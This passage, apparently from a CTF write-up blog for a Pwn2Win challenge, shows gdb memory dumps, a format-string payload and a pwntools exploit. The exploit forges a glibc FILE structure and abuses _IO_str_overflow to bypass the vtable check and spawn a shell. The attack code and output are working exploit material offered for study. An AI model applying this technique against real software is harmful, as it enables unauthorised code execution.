+0x5555557581e0:	0x0000000000000000	0x0000000000000000
+0x5555557581f0:	0x0000000000000000	0x0000000000000000
+0x555555758200:	0x0000000000000000	0x0000000000000000
+0x555555758210:	0x0000000000000000	0x0000000000000000
+0x555555758220:	0x0000000000000000	0x0000000000000000
+0x555555758230:	0x0000000000000000	0x0000000000000000
+0x555555758240:	0x0000000000000000	0x0000000000000000
+0x555555758250:	0x0000000000000000	0x0000000000000000
+0x555555758260:	0x0000000000000000	0x0000000000000000
+0x555555758270:	0x0000000000000000	0x0000000000000000
+0x555555758280:	0x0000000000000000	0x0000000000000000
+0x555555758290:	0x00007ffff7dcbd60 -&gt; vtable	0x0000000000001011
+0x5555557582a0:	0x37343132203a6449	0x2d0a393935313834 -&gt; all of user data
+
+</code></pre></div></div>
+
+<p>Also , let us analyze stack at the instance of triggering the format string bug.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+0000| 0x7fffffffec90 <span class="nt">--</span><span class="o">&gt;</span> 0x7fffffffecf0 <span class="nt">--</span><span class="o">&gt;</span> 0x555555758070 <span class="nt">--</span><span class="o">&gt;</span> 0xfbad2c84 -&gt; Interestingly , the pointer to file structure is also stored here. 
+0008| 0x7fffffffec98 <span class="nt">--</span><span class="o">&gt;</span> 0x7fffffffed00 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0016| 0x7fffffffeca0 <span class="nt">--</span><span class="o">&gt;</span> 0xa55756080 
+0024| 0x7fffffffeca8 <span class="nt">--</span><span class="o">&gt;</span> 0x7ffff7ff 
+0032| 0x7fffffffecb0 <span class="nt">--</span><span class="o">&gt;</span> 0x666564636261 <span class="o">(</span><span class="s1">'abcdef'</span><span class="o">)</span> -&gt; our input buf
+0040| 0x7fffffffecb8 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0048| 0x7fffffffecc0 <span class="nt">--</span><span class="o">&gt;</span> 0x202e724d <span class="o">(</span><span class="s1">'Mr. '</span><span class="o">)</span>
+0056| 0x7fffffffecc8 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0064| 0x7fffffffecd0 <span class="nt">--</span><span class="o">&gt;</span> 0x7fff00000000 
+0072| 0x7fffffffecd8 <span class="nt">--</span><span class="o">&gt;</span> 0x2c18ea94720bb00 
+0080| 0x7fffffffece0 <span class="nt">--</span><span class="o">&gt;</span> 0x7fffffffed60 <span class="nt">--</span><span class="o">&gt;</span> 0x555555555530 <span class="o">(</span>push   r15<span class="o">)</span>
+0088| 0x7fffffffece8 <span class="nt">--</span><span class="o">&gt;</span> 0x555555555500 <span class="o">(</span>mov    rax,QWORD PTR <span class="o">[</span>rbp-0x70]<span class="o">)</span>
+0096| 0x7fffffffecf0 <span class="nt">--</span><span class="o">&gt;</span> 0x555555758070 <span class="nt">--</span><span class="o">&gt;</span> 0xfbad2c84
+0104| 0x7fffffffecf8 <span class="nt">--</span><span class="o">&gt;</span> 0x6 
+0112| 0x7fffffffed00 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0120| 0x7fffffffed08 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0128| 0x7fffffffed10 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0136| 0x7fffffffed18 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0144| 0x7fffffffed20 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0152| 0x7fffffffed28 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0160| 0x7fffffffed30 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0168| 0x7fffffffed38 <span class="nt">--</span><span class="o">&gt;</span> 0x555555757d50 <span class="nt">--</span><span class="o">&gt;</span> 0xffffffffbe991a83 
+0176| 0x7fffffffed40 <span class="nt">--</span><span class="o">&gt;</span> 0x555555757ee0 <span class="nt">--</span><span class="o">&gt;</span> 0x3039 <span class="o">(</span><span class="s1">'90'</span><span class="o">)</span>
+0184| 0x7fffffffed48 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0192| 0x7fffffffed50 <span class="nt">--</span><span class="o">&gt;</span> 0x7fffffffee40 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0208| 0x7fffffffed60 <span class="nt">--</span><span class="o">&gt;</span> 0x555555555530 <span class="o">(</span>push   r15<span class="o">)</span>
+0216| 0x7fffffffed68 <span class="nt">--</span><span class="o">&gt;</span> 0x7ffff7a05b97 <span class="o">(</span>&lt;__libc_start_main+231&gt;:	mov    edi,eax<span class="o">)</span> -&gt; The good old libc_start_main
+
+</code></pre></div></div>
+<p>We observe that the very first offset of stack at the instance of format string being triggered is <strong>pointer to the file structure</strong>.</p>
+
+<p class="notice">So, we can directly use our old friend <strong>%n</strong> to completely fake the file structure.</p>
+
+<p>We can fake the file pointer to any of our allocated chunks.</p>
+
+<p>It’s time to craft our format string payload.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="s">'%32896c'</span> <span class="o">+</span> <span class="s">'%4$hn'</span>
+
+</code></pre></div></div>
+
+<p>We send the payload instead of name in the very beginning of our exploit.</p>
+
+<p>And now , after triggering the format string , we overwrite the file structure with our fake structure.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0000| 0x7fffffffec90 <span class="nt">--</span><span class="o">&gt;</span> 0x7fffffffecf0 <span class="nt">--</span><span class="o">&gt;</span> 0x555555758200 <span class="nt">--</span><span class="o">&gt;</span> 0xfbad2c84 -&gt; Before triggering format string
+0008| 0x7fffffffec98 <span class="nt">--</span><span class="o">&gt;</span> 0x7fffffffed00 <span class="nt">--</span><span class="o">&gt;</span> 0x555555758070 <span class="nt">--</span><span class="o">&gt;</span> 0x1e0f3 
+0016| 0x7fffffffeca0 <span class="nt">--</span><span class="o">&gt;</span> 0xa55756080 
+0024| 0x7fffffffeca8 <span class="nt">--</span><span class="o">&gt;</span> 0x4d1 
+0032| 0x7fffffffecb0 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+
+<span class="nt">-------x-----------x---------x----------x----------x</span>
+
+0000| 0x7fffffffec90 <span class="nt">--</span><span class="o">&gt;</span> 0x7fffffffecf0 <span class="nt">--</span><span class="o">&gt;</span> 0x555555758080 <span class="nt">--</span><span class="o">&gt;</span> 0x656863 <span class="o">(</span><span class="s1">'che'</span><span class="o">)</span> -&gt; We overwrote it yaaay!
+0008| 0x7fffffffec98 <span class="nt">--</span><span class="o">&gt;</span> 0x7fffffffed00 <span class="nt">--</span><span class="o">&gt;</span> 0x555555758070 <span class="nt">--</span><span class="o">&gt;</span> 0x1e0f3
+0016| 0x7fffffffeca0 <span class="nt">--</span><span class="o">&gt;</span> 0xa55756080
+0024| 0x7fffffffeca8 <span class="nt">--</span><span class="o">&gt;</span> 0x4d1
+
+</code></pre></div></div>
+
+<p>We fake the file struture somewhere close to our original file structure as we dont have leaks initially. We are doing this because the last 3 nibbles of any memory region are not effected by <strong>ASLR</strong> and hence we overwrite only the last 2 bytes of our original file structure to point it to our fake file structure.</p>
+
+<p>Let us craft our file structure.</p>
+
+<p>Here we are going to bypass vtable check by corrupting the value of vtable inorder to trigger <em>_IO_str_overflow</em>.</p>
+
+<p>Before crafting our file structure , let us try to understand how we trigger control flow with <em>IO_str_overflow</em>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">_IO_str_overflow</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">c</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">flush_only</span> <span class="o">=</span> <span class="n">c</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">;</span>
+  <span class="n">_IO_size_t</span> <span class="n">pos</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_WRITES</span><span class="p">)</span>
+      <span class="k">return</span> <span class="n">flush_only</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="n">EOF</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_TIED_PUT_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">))</span>
+    <span class="p">{</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">;</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="n">pos</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">pos</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="n">_IO_size_t</span><span class="p">)</span> <span class="p">(</span><span class="n">_IO_blen</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">+</span> <span class="n">flush_only</span><span class="p">))</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_USER_BUF</span><span class="p">)</span> <span class="cm">/* not allowed to enlarge */</span>
+        <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+      <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="kt">char</span> <span class="o">*</span><span class="n">new_buf</span><span class="p">;</span>
+      <span class="kt">char</span> <span class="o">*</span><span class="n">old_buf</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
+      <span class="kt">size_t</span> <span class="n">old_blen</span> <span class="o">=</span> <span class="n">_IO_blen</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+      <span class="n">_IO_size_t</span> <span class="n">new_size</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">old_blen</span> <span class="o">+</span> <span class="mi">100</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">new_size</span> <span class="o">&lt;</span> <span class="n">old_blen</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+      <span class="n">new_buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_IO_strfile</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_s</span><span class="p">.</span><span class="n">_allocate_buffer</span><span class="p">)</span> <span class="p">(</span><span class="n">new_size</span><span class="p">);</span>
+
+</code></pre></div></div>
+<p>By corrupting certain pointers of file structure , we can redirect the control flow to call</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">new_buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_IO_strfile</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_s</span><span class="p">.</span><span class="n">_allocate_buffer</span><span class="p">)</span> <span class="p">(</span><span class="n">new_size</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>It can be observed from the source code that -&gt;</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">_IO_size_t</span> <span class="n">new_size</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">old_blen</span> <span class="o">+</span> <span class="mi">100</span><span class="p">;</span>
+</code></pre></div></div>
+<p>Where <em>old_blen</em> is defined as -&gt;</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">old_blen</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span>
+
+</code></pre></div></div>
+<p>So , if we set <em>IO_buf_base</em> to 0 , and <em>_IO_buf_end</em> to <em>(binsh_ptr-100)/2</em> ,then <em>new_size</em> which is the first argument of <em>IO_strfile</em> function will be pointer to <strong>/bin/sh</strong>.</p>
+
+<p>But wait , we have one more restriction before getting control flow.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">pos</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">pos</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="n">_IO_size_t</span><span class="p">)</span> <span class="p">(</span><span class="n">_IO_blen</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">+</span> <span class="n">flush_only</span><span class="p">))</span>
+  <span class="p">{</span>
+    <span class="c1">// enter target condition</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+<p><em>flush_only</em> is 0, so we want <em>pos &gt;= _IO_blen(fp)</em>.</p>
+
+<p>This can be achieved by setting <em>_IO_write_ptr = (binsh - 100)/2</em> and <em>_IO_write_base = 0</em>.</p>
+
+<p>Let’s nicely recall what all need to go ahead now</p>
+
+<ol>
+  <li>set <em>IO_buf_base</em> to 0.</li>
+  <li>set <em>IO_buf_end</em> to <em>(binsh-100)/2</em></li>
+  <li>set <em>IO_write_ptr</em> to <em>(binsh-100)/2</em></li>
+  <li>set <em>IO_write_base</em> to 0</li>
+  <li>set vtable to <em>IO_str_overflow-0x10</em></li>
+</ol>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># We free this chunk and allocate it back as it is closest to our original file structure
+</span>
+    <span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">).</span><span class="nb">next</span><span class="p">()</span>  
+    <span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+    <span class="n">io_str_overflow_ptr_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_IO_file_jumps'</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0xd8</span>
+
+    <span class="c1">#Fake File Structure
+</span>    <span class="n">fake_vtable</span> <span class="o">=</span> <span class="n">io_str_overflow_ptr_addr</span> <span class="o">-</span> <span class="mi">2</span><span class="o">*</span><span class="mi">8</span>
+    <span class="n">fake_file_str</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x1430</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
+    <span class="n">fake_file_str</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">fake_file_str</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">((</span><span class="n">binsh</span><span class="o">-</span><span class="mi">100</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>  <span class="c1">#IO_write_ptr
+</span>    <span class="n">fake_file_str</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1430</span><span class="p">)</span>
+    <span class="n">fake_file_str</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#IO_buf_base
+</span>    <span class="n">fake_file_str</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">((</span><span class="n">binsh</span><span class="o">-</span><span class="mi">100</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span>     <span class="c1">#IO_buf_end
+</span>    <span class="n">fake_file_str</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span>
+    <span class="n">fake_file_str</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_IO_2_1_stderr_'</span><span class="p">])</span>
+    <span class="n">fake_file_str</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+    <span class="n">fake_file_str</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
+    <span class="n">fake_file_str</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x12e0</span><span class="p">)</span> 
+    <span class="n">fake_file_str</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span>
+    <span class="n">fake_file_str</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">fake_file_str</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x12f0</span><span class="p">)</span>
+    <span class="n">fake_file_str</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">fake_file_str</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000ffffffff</span><span class="p">)</span>
+    <span class="n">fake_file_str</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">fake_file_str</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_vtable</span><span class="p">)</span>
+    <span class="n">fake_file_str</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+    <span class="c1">#Add the fake file structure
+</span>    <span class="n">add</span><span class="p">(</span><span class="mi">123</span><span class="p">,</span><span class="s">'f'</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">fake_file_str</span><span class="p">)</span>
+    <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+    <span class="n">ret</span><span class="p">()</span>
+    <span class="n">send_commands</span><span class="p">(</span><span class="mi">1233</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<p>Boom , get shell!!</p>
+
+<h2 id="conclusion">CONCLUSION</h2>
+
+<p>I would like to thank the challenge author <a href="https://twitter.com/n0ps13d">n0ps13d</a> for creating such a beautiful challenge.
+Shout out to team <a href="https://twitter.com/Pwn2Win">Pwn2Win</a> for conducting the CTF.</p>
+
+<h2 id="resources">Resources</h2>
+
+<ol>
+  <li><a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/">Dhaval Kapil’s Blog</a></li>
+  <li><a href="https://github.com/vigneshsrao/File-xploit/blob/master/FilePointer.py">File Exploit offsets By sherlock_</a></li>
+</ol>
+
+<p>Here’ the <a href="https://gist.github.com/PwnVerse/fd225be6ec55144e9b32169ffbe9bc9a">link</a> to final exploit</p>
+
+:ET
